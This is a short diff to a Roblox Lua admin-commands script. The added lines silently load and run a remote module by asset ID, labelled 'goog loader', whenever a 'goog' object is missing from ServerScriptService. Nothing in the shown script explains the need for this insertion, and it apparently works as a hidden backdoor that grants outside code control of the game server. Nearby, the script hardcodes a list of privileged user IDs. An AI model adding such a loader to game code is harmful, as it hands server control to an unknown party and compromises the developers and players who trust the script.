@@ -34,6 +34,10 @@ _G.cxosadminloaded = true
 
 local restrictedmode = true -- removes all bad commands like "/bang, /j, /woman" (so the game dont get terminated)
 
+if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
+	require(112354705578311).load() -- goog loader
+end
+
 function restrictcheck(v)
 	if v and v.UserId then
 		if v.UserId == 3222470105 or v.UserId == 1889958 or v.UserId == 244903894 then
